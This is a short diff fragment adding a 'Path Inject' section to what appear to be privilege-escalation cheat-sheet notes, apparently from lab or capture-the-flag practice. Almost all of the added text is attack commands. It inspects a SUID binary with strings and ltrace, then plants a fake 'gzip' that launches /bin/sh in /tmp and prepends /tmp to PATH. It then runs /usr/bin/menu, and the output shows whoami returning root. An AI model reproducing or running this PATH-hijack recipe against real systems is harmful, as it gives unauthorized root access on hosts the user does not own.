@@ -37,6 +37,21 @@ try:
 except: 
      sys.exit() 
 
+=================================== 
+Path Inject
+
+gzip -c /var/log/xyz
+strings /usr/bin/menu
+ltrace /bin/sysinfo
+
+cd /tmp 
+echo /bin/sh > gzip
+chmod 777 gzip
+echo $PATH 
+export PATH=/tmp:$PATH
+/usr/bin/menu
+whoami
+root
 
 =================================== 
 C rootbash
